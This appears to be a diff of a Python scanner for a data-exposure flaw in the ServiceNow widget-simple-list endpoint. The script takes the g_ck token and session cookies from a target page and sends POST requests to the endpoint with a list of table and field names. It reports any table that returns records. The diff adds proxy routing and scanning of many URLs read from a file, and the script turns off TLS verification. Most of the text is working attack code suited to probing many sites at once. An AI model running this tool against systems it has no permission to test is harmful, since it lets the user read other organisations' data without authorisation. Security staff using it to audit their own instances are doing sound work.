@@ -1,13 +1,15 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-from bs4 import BeautifulSoup
 import argparse
 import requests
 import json
 import re
+requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
-def check_vulnerability(url, g_ck_value, cookies):
+
+
+def check_vulnerability(url, g_ck_value, cookies, s, proxies, fast_check):
     table_list = [
         "t=cmdb_model&f=name",
         "t=cmn_department&f=app_name",
@@ -30,7 +32,7 @@ def check_vulnerability(url, g_ck_value, cookies):
     ]
 
     if fast_check:
-        table_list = ["incident"]
+        table_list = ["t=kb_knowledge"]
 
     vulnerable_urls = []
 
@@ -46,7 +48,7 @@ def check_vulnerability(url, g_ck_value, cookies):
         post_url = f"{url}/api/now/sp/widget/widget-simple-list?{table}"
         data_payload = json.dumps({})  # Empty JSON payload
 
-        post_response = s.post(post_url, headers=headers, data=data_payload, verify=False)
+        post_response = s.post(post_url, headers=headers, data=data_payload, verify=False, proxies=proxies)
 
         if post_response.status_code == 200 or post_response.status_code == 201:
             response_json = post_response.json()
@@ -59,35 +61,59 @@ def check_vulnerability(url, g_ck_value, cookies):
     return vulnerable_urls
 
 
-parser = argparse.ArgumentParser(description='Fetch g_ck and cookies from a given URL')
-parser.add_argument('--url', required=True, help='The URL to fetch from')
-parser.add_argument('--fast-check', action='store_true', help='Only check for the table incident')
-args = parser.parse_args()
-url = args.url.rstrip('/')  # Normalize the URL by removing any trailing slashes
-fast_check = args.fast_check
 
-requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
+def check_url_get_headers(url, proxies):
+    # get the session 
+    s = requests.Session()
+    response = s.get(url, verify=False, proxies=proxies)
+    cookies = s.cookies.get_dict()
 
-s = requests.Session()
-
-response = s.get(url, verify=False)
-cookies = s.cookies.get_dict()
-soup = BeautifulSoup(response.text, 'html.parser')
-script_tags = soup.find_all('script')
-
-g_ck_value = None
-for tag in script_tags:
-    if tag.string:
-        match = re.search(r"var g_ck = '([a-zA-Z0-9]+)'", tag.string)
+    g_ck_value = None
+    if response.text:
+        match = re.search(r"var g_ck = '([a-zA-Z0-9]+)'", response.text)
         if match:
             g_ck_value = match.group(1)
-            break
+            return g_ck_value,cookies,s
 
-if not g_ck_value:
-    print(f"{url} - Error: g_ck not found.")
-    exit(1)
+    if not g_ck_value:
+        print(f"{url} - Error: g_ck not found.")
+        exit(1)
 
-vulnerable_urls = check_vulnerability(url, g_ck_value, cookies)
 
-if not vulnerable_urls:
-    print(f"Not affected tables.")
+def main(url,fast_check,proxy):
+    if proxy:
+        proxies = {'http': proxy, 'https': proxy}
+    else:
+        proxies = None
+
+    url = url.strip()
+    url = url.rstrip('/') 
+    g_ck_value,cookies,s = check_url_get_headers(url,proxies)
+    vulnerable_urls = check_vulnerability(url, g_ck_value, cookies, s, proxies, fast_check)
+    if not vulnerable_urls:
+        print(f"Not affected")
+
+
+if __name__=='__main__':
+    parser = argparse.ArgumentParser(description='Fetch g_ck and cookies from a given URL')
+    group = parser.add_mutually_exclusive_group(required=True)
+    group.add_argument('--url', help='The URL to fetch from')
+    group.add_argument('--file', help='File of URLs')
+    parser.add_argument('--fast-check', action='store_true', help='Only check for the table incident')
+    parser.add_argument('--proxy', help='Proxy server in the format http://host:port',default=None)
+    args = parser.parse_args()
+    fast_check = args.fast_check
+    proxy = args.proxy
+    if args.url:
+        main(args.url,fast_check,proxy)    
+    else:
+        try:
+            url_file=args.file
+            with open(url_file, 'r') as file:
+                url_list = file.readlines()
+            for url in url_list:
+                main(url,fast_check,proxy)
+        except FileNotFoundError:
+            print(f"Could not find {url_file}")
+        except Exception as e:
+            print(f"Error occurred: {e}")
